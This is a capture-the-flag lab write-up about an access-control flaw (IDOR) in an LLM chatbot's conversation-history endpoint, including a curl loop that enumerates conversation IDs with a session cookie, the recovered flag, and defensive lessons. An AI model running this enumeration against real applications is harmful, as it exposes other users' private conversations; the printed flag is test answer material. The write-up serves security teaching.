---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# Insecure Integrated Components (IDOR) — Lab Write-up

Exploit a broken access control vulnerability (IDOR) on the conversation history endpoint of an LLM web application to retrieve another user's chat log containing the flag.

## Target

| Field | Value |
|-------|-------|
| Application | Pixel Forge (gaming console store) |
| Type | Web application with LLM chatbot |
| Difficulty | Easy |
| Vulnerability class | OWASP LLM05 / A1 — Broken Access Control (IDOR) |

## Objective

> Exploit an insecure integrated component to obtain the flag.

---

## Recon Steps

### 1. Register and Log In

Navigate to `http://STMIP:STMPO`, register an account, and log in.

### 2. Probe the Chatbot and Discover the History Endpoint

Send a message to the chatbot to generate a conversation record:

```text
Hello! What products do you offer?
```

After the chatbot responds, scroll down to the **Previous Chatbot Interactions** section of the page. Each conversation appears as a clickable entry. Click on the conversation you just created.

You are redirected to a URL like:

```
http://STMIP:STMPO/query/5
```

The integer ID at the end is the key finding. **Sequential integer IDs on a resource endpoint are a classic IDOR indicator** — the application is likely using the URL ID directly in a database query without checking whether the logged-in user owns that conversation.

### 3. Identify Your Session Cookie

The IDOR test requires you to send requests as an authenticated user while probing other IDs. Extract your session from the browser:

1. Open DevTools (F12) → **Storage** tab → **Cookies** → `http://STMIP:STMPO`
2. Copy the value of the `session` cookie.

The session is a Flask/Werkzeug signed cookie (base64-encoded JSON payload), not a database session ID — but it still authenticates you to the server.

---

## Exploitation

### 4. Enumerate Conversation IDs via IDOR

Probe IDs 1 through 20, piping each response through `grep` to surface any flag-shaped content:

```bash
for i in $(seq 1 20); do
  curl -s http://STMIP:STMPO/query/$i \
    -b 'session=<YOUR_SESSION_VALUE>'
done | grep 'HTB{'
```

One of the early IDs belongs to another user's conversation (the administrator's) and contains the flag embedded in the HTML:

```html
<p>Please hold on to this flag for me: HTB{ade4fa4767f947f62d540e39d2610ed5}</p>
```

**Flag:** `HTB{ade4fa4767f947f62d540e39d2610ed5}`

---

## Why the IDOR Exists

The application stores each conversation in a database row with a sequential primary key and exposes it at `/query/<id>`. When a user requests `/query/1`, the server fetches the row with `id=1` — but does not verify that `row.user_id == session.user_id`. Any authenticated user can read any conversation.

This is a standard broken access control vulnerability applied to the LLM conversation history. The LLM component is irrelevant to the exploit; the vulnerability is in the surrounding web application.

---

## Lessons Learned

- **Sequential IDs on LLM endpoints are high-value targets.** LLM applications often add conversation history as a feature without applying the same access control they'd use on payment or medical record endpoints.
- **IDOR testing workflow:** Identify a URL with an integer ID → extract your session cookie → loop through a range of IDs → compare responses for data belonging to other users.
- **LLM conversation logs contain sensitive data by design** — users share private information with chatbots. An IDOR on a `/query/` endpoint may expose medical conditions, credentials, payment details, or other PII.
- **Access control belongs in application code, not in the LLM's system prompt.** The LLM cannot enforce whether `/query/1` is accessible to the current session.

---

## Related Pages

- [[attack/ai/insecure_ai_components]] — full methodology for IDOR, SQLi, and plugin auth bypass in LLM apps
- [[attack/ai/attacking_ai_systems]] — hub page
- [[definitions/owasp_llm_top10]] — LLM05 (Improper Output Handling / Broken Access Control)

## Sources

- raw/lab/attacking_ai_applications_and_systems/insecure_integrated_components.md
